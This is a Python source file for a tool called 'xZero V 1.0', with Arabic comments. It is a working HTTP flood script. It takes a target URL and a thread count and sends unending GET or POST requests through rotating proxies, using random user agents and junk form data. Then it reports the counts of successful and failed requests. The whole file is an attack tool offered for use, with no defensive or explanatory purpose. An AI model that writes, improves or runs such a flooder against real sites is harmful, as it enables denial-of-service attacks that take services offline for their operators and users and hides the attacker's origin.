import asyncio
import aiohttp
import random
from fake_useragent import UserAgent
from colorama import Fore, Style
import string
import os

os.system('clear')
print(f'''
{Fore.CYAN}

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RED} xZero V 1.0

{Style.RESET_ALL}
''')

# تهيئة User-Agent
ua = UserAgent()

# توليد بيانات POST عشوائية
def random_post_data(length=10):
    letters = string.ascii_letters + string.digits
    return {f'param_{i}': ''.join(random.choice(letters) for _ in range(length)) for i in range(1, 4)}

# هجوم HTTP مع عداد للطلبات الناجحة والفاشلة
async def http_attack(target, proxy=None, method="GET", headers=None, success_counter=None, failure_counter=None):
    async with aiohttp.ClientSession() as session:
        headers = headers or {'User-Agent': ua.random}  # توليد User-Agent عشوائي
        while True:
            try:
                if method.upper() == "POST":
                    # توليد بيانات POST عشوائية
                    data = random_post_data()
                    async with session.post(target, headers=headers, proxy=proxy, data=data) as res:
                        print(f"{Fore.GREEN}Request sent (POST) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
                        if success_counter is not None:
                            success_counter[0] += 1  # زيادة العداد
                else:
                    async with session.get(target, headers=headers, proxy=proxy) as res:
                        print(f"{Fore.GREEN}Request sent (GET) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
                        if success_counter is not None:
                            success_counter[0] += 1  # زيادة العداد

            except Exception as e:
                print(f"{Fore.RED}[ ! ] An error occurred: {str(e)}{Style.RESET_ALL}")
                if failure_counter is not None:
                    failure_counter[0] += 1  # زيادة العداد للفشل
            await asyncio.sleep(0.1)  # تأخير بين الطلبات لتقليل الضغط

async def main(url, threads, proxies, method):
    success_counter = [0]  # عداد الطلبات الناجحة
    failure_counter = [0]  # عداد الطلبات الفاشلة
    tasks = []
    for _ in range(threads):
        proxy = random.choice(proxies)  # اختيار بروكسي عشوائي
        tasks.append(asyncio.create_task(http_attack(url, proxy, method, None, success_counter, failure_counter)))
    await asyncio.gather(*tasks)

    # تقرير نهائي
    print(f"{Fore.CYAN}\n[!] Attack finished!")
    print(f"{Fore.GREEN}[+] Successful requests: {success_counter[0]}")
    print(f"{Fore.RED}[-] Failed requests: {failure_counter[0]}{Style.RESET_ALL}")

# تحميل قائمة البروكسيات من ملف
def load_proxies(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

if __name__ == "__main__":
    url = input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Target]
{Fore.CYAN}└──╼ ~ ❯ ''')
    
    try:
        threads = int(input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Threads]
{Fore.CYAN}└──╼ ~ ❯ '''))
    except ValueError:
        exit(f"{Fore.CYAN}Threads count is incorrect!")

    if threads <= 0:
        exit("Threads count must be greater than 0!")

    proxies = load_proxies("proxy_list.txt")
    if not proxies:
        exit("No proxies found in the file!")

    # تحديد نوع الطلب
    method = input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ GET / POST]
{Fore.CYAN}└──╼ ~ ❯ ''').strip().upper()
    if method not in ["GET", "POST"]:
        exit("Invalid method! Please choose GET or POST.")

    asyncio.run(main(url, threads, proxies, method))